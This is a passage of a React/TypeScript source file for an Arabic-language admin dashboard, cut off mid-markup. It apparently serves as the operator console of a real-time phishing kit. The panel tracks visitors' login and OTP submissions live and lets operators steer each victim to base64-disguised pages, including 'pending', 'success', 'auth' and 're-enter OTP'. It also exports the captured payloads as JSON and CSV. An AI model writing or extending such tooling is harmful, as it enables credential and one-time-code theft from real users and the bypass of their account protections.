import { createPortal } from "react-dom";
import { Suspense, lazy, useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { toast } from "sonner";
import {
  Shield, Bell, Loader2, Home, ArrowUp, LogOut as LogOutIcon, Volume2, VolumeX,
  ClipboardList, Clock as ClockIcon, Circle as Dot, Download, ListChecks, RefreshCw, Users,
  ChevronLeft, ChevronRight, FileSpreadsheet, Vibrate, VibrateOff,
} from "lucide-react";
import { hapticsEnabled, hapticsSupported, setHapticsEnabled } from "@/lib/haptics";
import { exportCustomersCsv } from "./csv";
import {
  CustomerRow, SearchBar, groupCustomers, useCustomerFilter, usePersistedState, FILTER_TONES, countFor,
  type Customer, type CustomerRowProps, type Req as FullReq, type Sub,
} from "./customers";
const CustomerDetails = lazy(() => import("./details").then((m) => ({ default: m.CustomerDetails })));

const NAV_FILTERS = [
  { key: "all", label: "الكل" },
  { key: "awaiting", label: "بانتظار قرارك" },
  { key: "otp", label: "رمز التحقق" },
  { key: "latest", label: "آخر الإدخالات" },
] as const;
import { useArrivalAlerts, useSoundSetting, LogDialog } from "./extras";
import { LatestFeed, countLatest } from "./latest-feed";
const AdminChatDock = lazy(() =>
  import("@/components/chat/admin-chat-dock").then((m) => ({ default: m.AdminChatDock })),
);
import { adminListRequests, adminListSubmissions, adminListSubmissionsSince, adminApplyAction, adminListActed, adminMarkLogoutConfirmed } from "@/lib/admin-data.functions";
import { claimCustomer, releaseCustomer, listClaims } from "@/lib/claims.functions";
import { lockAdmin } from "@/lib/admin-gate.functions";
import { useOnlineVisitors } from "@/lib/presence";
import { useChangeSignals, useRealtimeStatus } from "@/lib/change-signals";
import { notifyAdmin } from "@/lib/admin-events";
const PushSettingsDialog = lazy(() =>
  import("@/components/push-settings-dialog").then((m) => ({ default: m.PushSettingsDialog })),
);
import { ensureServiceWorker } from "@/lib/push-client";
import { useSupervisor, promptSupervisor } from "@/lib/supervisor";

function downloadJson(name: string, data: unknown) {
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = `${name}-${new Date().toISOString().slice(0, 10)}.json`;
  a.click(); URL.revokeObjectURL(url);
}

type Tab = "home" | "clients" | "notifications" | "more";

export function DashShell({ actor, onLocked }: { actor: string; onLocked: () => void }) {
  const qc = useQueryClient();
  const listReq = useServerFn(adminListRequests);
  const listSub = useServerFn(adminListSubmissions);
  const lock = useServerFn(lockAdmin);
  const listActed = useServerFn(adminListActed);
  const visitors = useOnlineVisitors();
  const [netOnline, setNetOnline] = useState(true);
  useEffect(() => {
    const up = () => setNetOnline(true), down = () => setNetOnline(false);
    window.addEventListener("online", up); window.addEventListener("offline", down);
    return () => { window.removeEventListener("online", up); window.removeEventListener("offline", down); };
  }, []);

  // staleTime قصير يمنع الطلبات المكرّرة لنفس البيانات؛ التحديث اللحظي يبطلها فوراً عند أي تغيير
  const reqQ = useQuery({ queryKey: ["dash2-requests"], queryFn: async () => (await listReq()) as unknown as FullReq[], placeholderData: (p) => p, staleTime: 5_000 });
  const subQ = useQuery({ queryKey: ["dash2-submissions"], queryFn: async () => (await listSub()) as unknown as Sub[], placeholderData: (p) => p, staleTime: 5_000 });
  const actedQ = useQuery({ queryKey: ["dash2-acted"], queryFn: async () => (await listActed()) as unknown as Record<string, unknown>, placeholderData: (p) => p, staleTime: 5_000 });
  const listClaimsFn = useServerFn(listClaims);
  const claimsQ = useQuery({ queryKey: ["dash2-claims"], queryFn: async () => (await listClaimsFn()) as unknown as Record<string, { supervisor: string; claimedAt: string; expiresAt: string }>, refetchInterval: 30000, placeholderData: (p) => p });
  const claimFn = useServerFn(claimCustomer);
  const releaseFn = useServerFn(releaseCustomer);

  // ======= مزامنة فرقية سريعة للإدخالات: نجلب فقط الجديد منذ آخر طابع زمني =======
  const sinceFn = useServerFn(adminListSubmissionsSince);
  const syncingRef = useRef(false);
  const pendingRef = useRef(false);
  const fullAtRef = useRef(0);
  const deltaSubs = useCallback(async () => {
    const cur = qc.getQueryData<Sub[]>(["dash2-submissions"]);
    const now = Date.now();
    // أول تحميل أو مزامنة كاملة دورية (تلتقط التعديلات والحذف)
    if (!cur || cur.length === 0 || now - fullAtRef.current > 60_000) {
      fullAtRef.current = now;
      void qc.invalidateQueries({ queryKey: ["dash2-submissions"], refetchType: "all" });
      return;
    }
    if (syncingRef.current) { pendingRef.current = true; return; }
    syncingRef.current = true;
    try {
      let since = cur[0]?.created_at ?? new Date(0).toISOString();
      for (const s of cur) if (s.created_at > since) since = s.created_at;
      // نافذة تداخل 3 ثوانٍ تلتقط الإدخالات ذات الطابع الزمني نفسه أو المتأخرة قليلاً (التكرار يُزال بالمعرّف)
      since = new Date(new Date(since).getTime() - 3000).toISOString();
      const rows = (await sinceFn({ data: { since } })) as unknown as Sub[];
      if (rows.length) {
        qc.setQueryData<Sub[]>(["dash2-submissions"], (prev) => {
          const map = new Map((prev ?? []).map((s) => [s.id, s] as const));
          let changed = false;
          for (const r of rows) {
            const old = map.get(r.id);
            if (!old || JSON.stringify(old) !== JSON.stringify(r)) { map.set(r.id, r); changed = true; }
          }
          if (!changed) return prev;
          return [...map.values()].sort((a, b) => (a.created_at < b.created_at ? 1 : a.created_at > b.created_at ? -1 : 0));
        });
      }
    } catch {
      void qc.invalidateQueries({ queryKey: ["dash2-submissions"], refetchType: "all" }, { cancelRefetch: false });
    } finally {
      syncingRef.current = false;
      if (pendingRef.current) { pendingRef.current = false; void deltaSubs(); }
    }
  }, [qc, sinceFn]);

  // تحديث موجّه: كل إشارة تحدّث فقط البيانات المتأثرة، بدون إلغاء طلب جارٍ (لا عواصف إلغاء)
  const refetchKey = useCallback((k: string) => {
    void qc.invalidateQueries({ queryKey: [k], refetchType: "all" }, { cancelRefetch: false });
  }, [qc]);
  const refreshAll = useCallback(() => {
    void deltaSubs();
    for (const k of ["dash2-requests", "dash2-acted", "dash2-claims"]) refetchKey(k);
  }, [deltaSubs, refetchKey]);
  const onSignal = useCallback((source: string) => {
    if (source === "db:submission") return void deltaSubs();
    if (source === "db:acted") return refetchKey("dash2-acted");
    if (source === "db:request" || source === "db:route") return refetchKey("dash2-requests");
    refreshAll();
  }, [deltaSubs, refetchKey, refreshAll]);
  // المزامنة الاحتياطية (تركيز/عودة/فاصل) مخنوقة: مرة واحدة كل 1.5 ثانية كحد أقصى
  const lastResyncRef = useRef(0);
  const onResync = useCallback(() => {
    const now = Date.now();
    if (now - lastResyncRef.current < 1500) return;
    lastResyncRef.current = now;
    refreshAll();
  }, [refreshAll]);

  useChangeSignals(onSignal, onResync);
  const { live: rtLive, lastSignalAt } = useRealtimeStatus();
  const [, forceTick] = useState(0);
  useEffect(() => { const t = window.setInterval(() => forceTick((x) => x + 1), 15000); return () => window.clearInterval(t); }, []);
  const sinceSignal = lastSignalAt ? Math.max(0, Math.floor((Date.now() - lastSignalAt) / 1000)) : null;
  const sinceLabel = sinceSignal == null ? "—" : sinceSignal < 10 ? "الآن" : sinceSignal < 60 ? `قبل ${sinceSignal}ث` : sinceSignal < 3600 ? `قبل ${Math.floor(sinceSignal/60)}د` : `قبل ${Math.floor(sinceSignal/3600)}س`;

  // تسجيل مبكر لعامل الخدمة فور فتح اللوحة ليكون جاهزاً للاشتراك فور الضغط على «تفعيل».
  useEffect(() => { void ensureServiceWorker(); }, []);
  // تحميل مسبق لبطاقة التفاصيل بعد ظهور اللوحة حتى تفتح فوراً
  useEffect(() => { const t = window.setTimeout(() => { void import("./details"); }, 1500); return () => window.clearTimeout(t); }, []);

  // اسم المشرف لهذا الجهاز — يظهر على بطاقات العملاء الذين وجّههم.
  const [supervisor, setSupervisorName] = useSupervisor();
  useEffect(() => {
    if (supervisor) return;
    const t = window.setTimeout(() => {
      const v = promptSupervisor("");
      if (v) setSupervisorName(v);
    }, 400);
    return () => window.clearTimeout(t);
  }, [supervisor, setSupervisorName]);
  const changeSupervisor = () => {
    const v = promptSupervisor(supervisor);
    if (v !== null) setSupervisorName(v);
  };




  const [soundOn, toggleSound] = useSoundSetting();
  useArrivalAlerts(subQ.data, soundOn);

  const customers = useMemo(() => groupCustomers(subQ.data ?? [], reqQ.data ?? []), [subQ.data, reqQ.data]);
  const onlineKeys = useMemo(() => {
    const set = new Set<string>();
    for (const v of visitors) {
      if (v.email) set.add(v.email.toLowerCase());
      if (v.sessionId) set.add(v.sessionId);
    }
    return set;
  }, [visitors]);
  // صفحة العميل اللحظية (من قناة الحضور) — مفتاحها البريد أو session_id.
  const livePageMap = useMemo(() => {
    const m = new Map<string, { page: string; at: string; sinceAt: string }>();
    for (const v of visitors) {
      const entry = { page: v.page, at: v.at, sinceAt: v.sinceAt };
      if (v.email) m.set(v.email.toLowerCase(), entry);
      if (v.sessionId) m.set(v.sessionId, entry);
    }
    return m;
  }, [visitors]);
  const livePageFor = (c: typeof customers[number]) => {
    if (c.email) {
      const h = livePageMap.get(c.email.toLowerCase());
      if (h) return h;
    }
    for (const sid of c.sessionIds) {
      const h = livePageMap.get(sid);
      if (h) return h;
    }
    return null;
  };
  // العميل «بانتظار قرارك» إذا كان واقفاً الآن على صفحة الانتظار، أو كانت آخر خطوة له
  // إدخال بيانات الدخول/الرمز، أو طلبه قيد المراجعة — ولم يُتّخذ بحقه قرار بعد آخر خطوة.
  const awaitingKeys = useMemo(() => {
    const livePending = new Set<string>();
    for (const v of visitors) {
      if (v.page !== "/cGVuZGluZw") continue;
      if (v.email) livePending.add(v.email.toLowerCase());
      if (v.sessionId) livePending.add(v.sessionId);
    }
    const acted = (actedQ.data ?? {}) as Record<string, { actedAt: string } | undefined>;
    const out = new Set<string>();
    for (const c of customers) {
      // subs مرتّبة من الأحدث للأقدم عند التجميع، فأول عنصر هو الأحدث
      const last = c.subs[0];
      const sid = c.sessionIds[0];
      const onPending = (c.email && livePending.has(c.email.toLowerCase())) || (sid && livePending.has(sid));
      const waiting = onPending || last?.kind === "login_attempt" || last?.kind === "otp_attempt" || last?.kind === "logout_confirmed" || c.request?.status === "under_review";
      if (!waiting) continue;
      const a = acted[c.key];
      const lastAt = last?.created_at ?? c.lastAt;
      if (a && new Date(a.actedAt).getTime() >= new Date(lastAt).getTime()) continue;
      out.add(c.key);
    }
    return out;
  }, [customers, visitors, actedQ.data]);
  const isOnline = (c: typeof customers[number]) =>
    (c.email ? onlineKeys.has(c.email.toLowerCase()) : false) ||
    c.sessionIds.some((sid) => onlineKeys.has(sid));

  const [selected, setSelected] = useState<string | null>(null);
  const [tab, setTab] = useState<Tab>("home");
  const [pushOpen, setPushOpen] = useState(false);
  const [logOpen, setLogOpen] = useState(false);
  const [haptics, setHaptics] = useState(false);
  useEffect(() => setHaptics(hapticsEnabled()), []);
  const toggleHaptics = () => { const v = !haptics; setHapticsEnabled(v); setHaptics(v); };
  const [hideOffline, setHideOffline] = usePersistedState<boolean>("sham_dash_hide_offline", false);
  const [compactRows, setCompactRows] = usePersistedState<boolean>("sham_dash_compact", false);
  const current = customers.find((c) => c.key === selected) ?? null;

  const apply = useServerFn(adminApplyAction);
  const swipeMut = useMutation({
    mutationFn: (v: { c: Customer; status: string; route: string; note?: string | null; label: string }) => apply({ data: {
      key: v.c.key, emails: v.c.email ? [v.c.email] : [], sessionId: v.c.sessionIds[0] ?? null,
      requestId: v.c.request?.id ?? null, status: v.status, route: v.route, note: v.note ?? null,
      supervisor: supervisor || null,
    } }),
    onSuccess: (_d, v) => {
      toast.success(`✓ ${v.label} — تم التوجيه إلى ${v.route}`, { duration: 3500 });
      qc.setQueryData(["dash2-acted"], (prev: Record<string, unknown> | undefined) => ({
        ...(prev ?? {}),
        [v.c.key]: { actedAt: new Date().toISOString(), actor: supervisor || "self", status: v.status, route: v.route, note: v.note ?? null },
      }));
      void qc.invalidateQueries({ queryKey: ["dash2-requests"] });
      void qc.invalidateQueries({ queryKey: ["dash2-acted"] });
      void qc.invalidateQueries({ queryKey: ["dash2-submissions"] });
      notifyAdmin({ kind: "request-updated", email: v.c.email ?? null, key: v.c.key, status: v.status, route: v.route, note: v.note ?? null, actedAt: new Date().toISOString(), actor: supervisor || "self" });
    },
    onError: () => toast.error("تعذّر التنفيذ"),
  });
  const swipeMutate = swipeMut.mutate;
  const onSwipeAccept = useCallback((c: Customer) => {
    if (!window.confirm(`قبول ${c.name ?? c.email ?? "العميل"}؟`)) return;
    swipeMutate({ c, status: "verified", route: "/c3VjY2Vzcw", label: "تم القبول" });
  }, [swipeMutate]);
  const onSwipeReject = useCallback((c: Customer) => {
    const reason = window.prompt("سبب الرفض:", "تم رفض طلبك بعد المراجعة.");
    if (reason === null) return;
    const t = reason.trim(); if (!t) return;
    swipeMutate({ c, status: "rejected", route: "/YXV0aA", note: `rejected:${t}`, label: "تم الرفض" });
  }, [swipeMutate]);

  const markLogout = useServerFn(adminMarkLogoutConfirmed);
  const logoutMut = useMutation({
    mutationFn: (c: Customer) => markLogout({ data: {
      key: c.key,
      email: c.email,
      sessionId: c.sessionIds[0] ?? null,
      supervisor: supervisor || null,
    } }),
    onSuccess: (_d, c) => {
      toast.success(`✓ تم تعليم ${c.name ?? c.email ?? "العميل"} كمسجَّل خروجه`, { duration: 3000 });
      qc.setQueryData(["dash2-acted"], (prev: Record<string, unknown> | undefined) => {
        const next = { ...(prev ?? {}) };
        delete next[c.key];
        return next;
      });
      void qc.invalidateQueries({ queryKey: ["dash2-submissions"] });
      void qc.invalidateQueries({ queryKey: ["dash2-acted"] });
      notifyAdmin({ kind: "request-updated", email: c.email ?? null, key: c.key, status: "logout_confirmed", actedAt: new Date().toISOString(), actor: "self" });
    },
    onError: () => toast.error("تعذّر التنفيذ"),
  });
  const onConfirmLogout = (c: Customer) => {
    if (!window.confirm(`تعليم ${c.name ?? c.email ?? "العميل"} كمسجَّل خروجه؟`)) return;
    logoutMut.mutate(c);
  };

  const visibleCustomers = useMemo(
    () => (hideOffline ? customers.filter(isOnline) : customers),
    [customers, hideOffline, onlineKeys], // eslint-disable-line react-hooks/exhaustive-deps
  );
  // «رمز التحقق» = كل العملاء الذين وُجّهوا إلى صفحة /b3Rw (إعادة الرمز)
  const otpKeys = useMemo(() => {
    const acted = (actedQ.data ?? {}) as Record<string, { route?: string | null } | undefined>;
    const out = new Set<string>();
    for (const [k, v] of Object.entries(acted)) if (v?.route === "/b3Rw") out.add(k);
    return out;
  }, [actedQ.data]);
  const filter = useCustomerFilter(visibleCustomers, onlineKeys, awaitingKeys, otpKeys);

  const totalReq = subQ.data ? customers.length : null;
  // نفس قاعدة فلتر «بانتظار قرارك» حتى يطابق رقم البطاقة القائمة التي تفتحها
  const underReview = subQ.data ? countFor("awaiting", visibleCustomers, onlineKeys, awaitingKeys) : null;
  const onlineCount = visitors.length;
  const latestCount = subQ.data ? countLatest(subQ.data) : null;

  const refresh = () => {
    void qc.invalidateQueries({ queryKey: ["dash2-requests"] });
    void qc.invalidateQueries({ queryKey: ["dash2-submissions"] });
  };
  const doLogout = async () => {
    if (!window.confirm("تسجيل الخروج؟")) return;
    try { await lock(); } catch { /* ignore */ }
    onLocked();
  };

  useEffect(() => { if (selected) window.scrollTo({ top: 0 }); }, [selected]);

  // زر الرجوع في الجوال/المتصفح يغلق التفاصيل بدل مغادرة اللوحة
  const openCustomer = async (key: string) => {
    let name = supervisor.trim();
    if (!name) {
      const v = promptSupervisor("");
      if (!v) { toast.error("أدخل اسم المشرف أولاً لفتح بطاقات العملاء"); return; }
      setSupervisorName(v); name = v;
    }
    // لا قفل: أي مشرف يستطيع فتح أي بطاقة. نسجّل الفتح فقط لإظهار من يعمل عليها.
    let owner = true;
    try {
      const res = await claimFn({ data: { key, supervisor: name } });
      owner = res.isOwner;
      if (!res.isOwner) toast.info(`المشرف ${res.owner} يعمل على هذه البطاقة أيضاً`, { duration: 3000 });
    } catch { /* ignore */ }
    if (owner) {
      qc.setQueryData(["dash2-claims"], (prev: Record<string, { supervisor: string; claimedAt: string; expiresAt: string }> | undefined) => ({
        ...(prev ?? {}),
        [key]: { supervisor: name, claimedAt: new Date().toISOString(), expiresAt: new Date(Date.now() + 15 * 60_000).toISOString() },
      }));
    }
    notifyAdmin({ kind: "claim-changed", key, actor: name, actedAt: new Date().toISOString() });
    if (!selected) window.history.pushState({ dashDetail: true }, "");
    setSelected(key);
  };
  const closeCustomer = () => {
    const key = selected;
    const name = supervisor.trim();
    if (key && name) {
      void releaseFn({ data: { key, supervisor: name } }).then(() => {
        qc.setQueryData(["dash2-claims"], (prev: Record<string, unknown> | undefined) => {
          const next = { ...(prev ?? {}) }; delete next[key]; return next;
        });
        notifyAdmin({ kind: "claim-changed", key, actor: name, released: true, actedAt: new Date().toISOString() });
      }).catch(() => { /* ignore */ });
    }
    if (window.history.state?.dashDetail) window.history.back(); else setSelected(null);
  };
  useEffect(() => {
    const onPop = () => setSelected(null);
    window.addEventListener("popstate", onPop);
    return () => window.removeEventListener("popstate", onPop);
  }, []);
  // تجديد الحجز كل 5 دقائق أثناء فتح التفاصيل
  useEffect(() => {
    if (!selected || !supervisor.trim()) return;
    const t = window.setInterval(() => {
      void claimFn({ data: { key: selected, supervisor: supervisor.trim() } }).catch(() => { /* ignore */ });
    }, 5 * 60_000);
    return () => window.clearInterval(t);
  }, [selected, supervisor, claimFn]);
  // لا نحتاج لتحرير يدوي عند إغلاق التبويب — انتهاء الحجز التلقائي بعد 15 دقيقة يكفي.

  // أعداد شريط التنقل تُحسب مرة واحدة لكل تغيّر بيانات بدل كل رسم
  const navCounts = useMemo(() => {
    const m: Record<string, number> = {};
    for (const f of NAV_FILTERS) if (f.key !== "latest") m[f.key] = countFor(f.key, visibleCustomers, onlineKeys, awaitingKeys, otpKeys);
    return m;
  }, [visibleCustomers, onlineKeys, awaitingKeys, otpKeys]);

  // عرض تدريجي للقائمة الطويلة: دفعة أصغر على الهاتف ليبدأ العرض فوراً، ثم المزيد تلقائياً عند التمرير
  const initialBatch = typeof window !== "undefined" && window.matchMedia("(max-width: 768px)").matches ? 15 : 40;
  const [visibleCount, setVisibleCount] = useState(initialBatch);
  useEffect(() => { setVisibleCount(initialBatch); }, [filter.filter, filter.query, initialBatch]);

  // معالِجات ثابتة لكل بطاقة حتى لا تُعاد رسمة القائمة كاملة مع كل تحديث
  const customersRef = useRef(customers); customersRef.current = customers;
  const openRef = useRef(openCustomer); openRef.current = openCustomer;
  const confirmRef = useRef(onConfirmLogout); confirmRef.current = onConfirmLogout;
  const handlersMap = useRef(new Map<string, { open: () => void; confirm: () => void }>()).current;
  const rowHandlers = useCallback((key: string) => {
    let h = handlersMap.get(key);
    if (!h) {
      h = {
        open: () => { void openRef.current(key); },
        confirm: () => { const c = customersRef.current.find((x) => x.key === key); if (c) confirmRef.current(c); },
      };
      handlersMap.set(key, h);
    }
    return h;
  }, [handlersMap]);

  const listKeys = useMemo(() => filter.list.map((c) => c.key), [filter.list]);
  const idx = selected ? listKeys.indexOf(selected) : -1;
  const goRel = (d: number) => {
    if (idx < 0) return;
    const k = listKeys[idx + d];
    if (k) setSelected(k);
  };

  // اختصارات لوحة المفاتيح لسطح المكتب — مستمع واحد ثابت (لا يُعاد تسجيله مع كل رسم)
  const keyHandlerRef = useRef<(e: KeyboardEvent) => void>(() => {});
  keyHandlerRef.current = (e: KeyboardEvent) => {
    const t = e.target as HTMLElement;
    if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.tagName === "SELECT" || t.isContentEditable)) {
      if (e.key === "Escape") t.blur();
      return;
    }
    if (e.metaKey || e.ctrlKey || e.altKey) return;
    if (e.key === "Escape" && selected) { e.preventDefault(); closeCustomer(); }
    else if (e.key === "/") { e.preventDefault(); if (selected) closeCustomer(); setTimeout(() => (document.querySelector<HTMLInputElement>('input[placeholder="بحث..."]'))?.focus(), 50); }
    else if (selected && (e.key === "ArrowLeft" || e.key === "j")) goRel(1);
    else if (selected && (e.key === "ArrowRight" || e.key === "k")) goRel(-1);
    else if (!selected && e.key === "Enter" && listKeys[0]) void openCustomer(listKeys[0]);
    else if (/^[1-9]$/.test(e.key)) { const f = NAV_FILTERS[Number(e.key) - 1]; if (f) { filter.setFilter(f.key); if (selected) closeCustomer(); } }
  };
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => keyHandlerRef.current(e);
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, []);

  return (
    <div dir="rtl" className="dash-dark min-h-screen bg-slate-100 pb-[max(5.5rem,env(safe-area-inset-bottom))] font-sans text-slate-800">
      <Suspense fallback={null}><AdminChatDock /></Suspense>

      <header className="sticky top-0 z-40 bg-gradient-to-r from-slate-950 via-slate-900 to-slate-950 px-3 pt-[max(0.6rem,env(safe-area-inset-top))] pb-2.5 text-white shadow-lg ring-1 ring-cyan-500/20">
        <div className="mx-auto flex max-w-md items-center justify-between gap-2 md:max-w-3xl lg:max-w-6xl lg:px-4">
          <div className="flex min-w-0 items-center gap-2">
            <div className="grid size-9 shrink-0 place-items-center rounded-2xl border border-cyan-400/30 bg-gradient-to-br from-cyan-500/30 to-sky-500/20 shadow-sm backdrop-blur-md">
              <Shield className="size-4.5 text-cyan-300" />
            </div>
            <div className="min-w-0">
              <h1 className="truncate text-[15px] leading-tight font-extrabold bg-gradient-to-l from-cyan-300 to-sky-200 bg-clip-text text-transparent">لوحة التحكم</h1>
              <button onClick={changeSupervisor} className="group flex max-w-full items-center gap-1 truncate text-[10.5px] font-medium text-slate-300 transition hover:text-cyan-200" title="تغيير اسم المشرف">
                <span className="truncate">المشرف: <span className="font-bold text-cyan-200">{supervisor || "غير محدّد — اضغط للإدخال"}</span></span>
              </button>
            </div>
          </div>
          <div className="flex shrink-0 items-center gap-1">
            <button onClick={toggleSound} aria-label="الصوت" title={soundOn ? "إيقاف الصوت" : "تشغيل الصوت"}
              className="grid size-8 place-items-center rounded-xl border border-white/10 bg-white/5 text-cyan-200 transition-all active:scale-95 hover:border-cyan-400/40 hover:bg-cyan-500/10">
              {soundOn ? <Volume2 className="size-3.5" /> : <VolumeX className="size-3.5" />}
            </button>
            {hapticsSupported() && (
              <button onClick={toggleHaptics} aria-label="الاهتزاز" title={haptics ? "إيقاف الاهتزاز" : "تشغيل الاهتزاز"}
                className="grid size-8 place-items-center rounded-xl border border-white/10 bg-white/5 text-cyan-200 transition-all active:scale-95 hover:border-cyan-400/40 hover:bg-cyan-500/10">
                {haptics ? <Vibrate className="size-3.5" /> : <VibrateOff className="size-3.5" />}
              </button>
            )}
            <button onClick={() => setPushOpen(true)} aria-label="الإشعارات"
              className="relative grid size-8 place-items-center rounded-xl border border-white/10 bg-white/5 text-cyan-200 transition-all active:scale-95 hover:border-cyan-400/40 hover:bg-cyan-500/10">
              <Bell className="size-3.5" />
              {underReview ? (
                <span className="absolute -top-1 -right-1 rounded-full border-2 border-slate-950 bg-cyan-500 px-1 py-0.5 text-[8.5px] font-black leading-none text-slate-950">
                  {underReview > 99 ? "+99" : underReview}
                </span>
              ) : null}
            </button>
            <a href="/ZGV2aWNlcw" aria-label="إدارة الأجهزة" title="إدارة الأجهزة المسجّلة"
              className="grid size-8 place-items-center rounded-xl border border-white/10 bg-white/5 text-cyan-200 transition-all active:scale-95 hover:border-cyan-400/40 hover:bg-cyan-500/10">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-3.5"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>
            </a>
            <button onClick={doLogout} aria-label="خروج"
              className="grid size-8 place-items-center rounded-xl border border-white/10 bg-white/5 text-cyan-200 transition-all active:scale-95 hover:border-cyan-400/40 hover:bg-cyan-500/10">
              <LogOutIcon className="size-3.5" />
            </button>
          </div>
        </div>
      </header>

      <div className={`mx-auto max-w-md space-y-3 px-2.5 py-3 md:max-w-3xl md:px-4 md:py-5 ${current ? "lg:max-w-4xl" : "lg:max-w-6xl"}`}>
        {current ? (
          <>
            {idx >= 0 && (
              <div className="sticky top-[calc(env(safe-area-inset-top)+3.6rem)] z-30 flex items-center gap-2 rounded-2xl border border-slate-200/80 bg-white/95 p-1.5 shadow-sm backdrop-blur">
                <button onClick={() => goRel(-1)} disabled={idx <= 0} aria-label="العميل السابق"
                  className="flex items-center gap-1 rounded-xl px-3 py-2 text-[11px] font-black text-slate-700 transition active:scale-95 hover:bg-slate-100 disabled:opacity-30">
                  <ChevronRight className="size-4" /> السابق
                </button>
                <div className="min-w-0 flex-1 text-center text-[11px] font-bold text-slate-500 tabular-nums">
                  {idx + 1} / {listKeys.length}
                  <span className="mx-1 hidden text-slate-300 md:inline">•</span>
                  <span className="hidden text-[10px] text-slate-400 md:inline">← → للتنقل · Esc للرجوع</span>
                </div>
                <button onClick={() => goRel(1)} disabled={idx >= listKeys.length - 1} aria-label="العميل التالي"
                  className="flex items-center gap-1 rounded-xl px-3 py-2 text-[11px] font-black text-slate-700 transition active:scale-95 hover:bg-slate-100 disabled:opacity-30">
                  التالي <ChevronLeft className="size-4" />
                </button>
              </div>
            )}
            <Suspense fallback={<div className="h-40 animate-pulse rounded-2xl bg-slate-100" />}>
              <CustomerDetails customer={current} online={isOnline(current)} livePage={livePageFor(current)} onClose={closeCustomer} />
            </Suspense>
          </>
        ) : (
          <>
            <div className="space-y-3 lg:grid lg:grid-cols-[minmax(0,1fr)_minmax(0,1.4fr)] lg:items-stretch lg:gap-3 lg:space-y-0">
            <div className="flex items-stretch gap-2 rounded-2xl border border-slate-200/80 bg-white p-2 shadow-sm">
              <div className={`flex min-w-0 flex-1 items-center gap-2.5 rounded-xl px-3 py-2 ${!netOnline ? "bg-slate-50" : rtLive ? "bg-emerald-50/70" : "bg-amber-50/70"}`}>
                <span className="relative flex size-3 shrink-0">
                  <span className={`absolute inline-flex size-full rounded-full opacity-60 ${!netOnline ? "bg-slate-300" : rtLive ? "animate-ping bg-emerald-400" : "animate-pulse bg-amber-400"}`} />
                  <span className={`relative inline-flex size-3 rounded-full ${!netOnline ? "bg-slate-400" : rtLive ? "bg-emerald-500" : "bg-amber-500"}`} />
                </span>
                <div className="min-w-0 leading-tight">
                  <div className={`truncate text-[12.5px] font-black ${!netOnline ? "text-slate-500" : rtLive ? "text-emerald-700" : "text-amber-700"}`}>
                    {!netOnline ? "غير متصل" : rtLive ? "بث مباشر" : "مزامنة احتياطية"}
                  </div>
                  <div className="flex items-center gap-2 text-[11px] font-bold text-slate-600">
                    <span className="flex items-center gap-1"><Users className="size-3" /><span className="tabular-nums">{onlineCount}</span></span>
                    <span className="text-slate-300">•</span>
                    <span className="truncate tabular-nums">آخر تحديث: {sinceLabel}</span>
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-1 rounded-xl bg-slate-50 p-1" role="group" aria-label="أدوات">
                <ToolBtn onClick={refresh} label="تحديث" title="تحديث البيانات">
                  <RefreshCw className={`size-4.5 ${(reqQ.isFetching || subQ.isFetching) ? "animate-spin text-orange-600" : ""}`} />
                </ToolBtn>
                <ToolBtn onClick={() => setLogOpen(true)} label="سجل" title="سجل الأحداث">
                  <ListChecks className="size-4.5" />
                </ToolBtn>
                <ToolBtn onClick={() => downloadJson("customers", filter.list.map(({ subs, ...c }) => ({ ...c, steps: subs.map((x) => ({ kind: x.kind, page: x.page, at: x.created_at, data: x.payload })) })))} disabled={!filter.list.length} label="JSON" title="تنزيل JSON للعملاء الظاهرين">
                  <Download className="size-4.5" />
                </ToolBtn>
                <ToolBtn onClick={() => exportCustomersCsv(filter.list)} disabled={!filter.list.length} label="CSV" title="تصدير CSV للعملاء الظاهرين">
                  <FileSpreadsheet className="size-4.5" />
                </ToolBtn>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-2 md:gap-3">
              <StatBox active={filter.filter === "all" && !hideOffline} onClick={() => { filter.setFilter("all"); setHideOffline(false); }} value={totalReq} label="العملاء" Icon={ClipboardList} ring="from-slate-100 to-white" tone="text-slate-900" iconTone="text-slate-500" activeTone="ring-slate-900/80" />
              <StatBox active={filter.filter === "awaiting"} onClick={() => filter.setFilter("awaiting")} value={underReview} label="قيد المراجعة" Icon={ClockIcon} ring="from-amber-50 to-white" tone="text-amber-600" iconTone="text-amber-500" activeTone="ring-amber-500" />
              <StatBox active={filter.filter === "latest"} onClick={() => { setHideOffline(false); filter.setFilter("latest"); }} value={latestCount} label="آخر الإدخالات" Icon={Bell} ring="from-cyan-50 to-white" tone="text-cyan-700" iconTone="text-cyan-500" activeTone="ring-cyan-500" pulse />
            </div>

            </div>

            <SearchBar
              filter={filter.filter} setFilter={(v) => { if (v === "offline") setHideOffline(false); filter.setFilter(v); }}
              query={filter.query} setQuery={filter.setQuery}
              onRefresh={refresh} refreshing={reqQ.isFetching || subQ.isFetching}
              onClearOffline={() => { if (filter.filter === "offline") filter.setFilter("all"); setHideOffline((v) => !v); }}
              hideOffline={hideOffline}
              total={filter.list.length}
              customers={visibleCustomers} onlineKeys={onlineKeys} actedKeys={awaitingKeys} otpKeys={otpKeys}
              compact={compactRows} onToggleCompact={() => setCompactRows((v) => !v)}
            />


            {(reqQ.isLoading || subQ.isLoading) && (
              <p className="flex items-center justify-center gap-2 py-6 text-xs text-slate-500">
                <Loader2 className="size-4 animate-spin" /> جارٍ التحميل...
              </p>
            )}

            {(reqQ.isError || subQ.isError) && !(reqQ.isLoading || subQ.isLoading) && (
              <div className="flex flex-col items-center gap-2 rounded-2xl border border-rose-200 bg-rose-50 p-6 text-center">
                <p className="text-xs font-black text-rose-700">تعذّر تحميل بيانات العملاء</p>
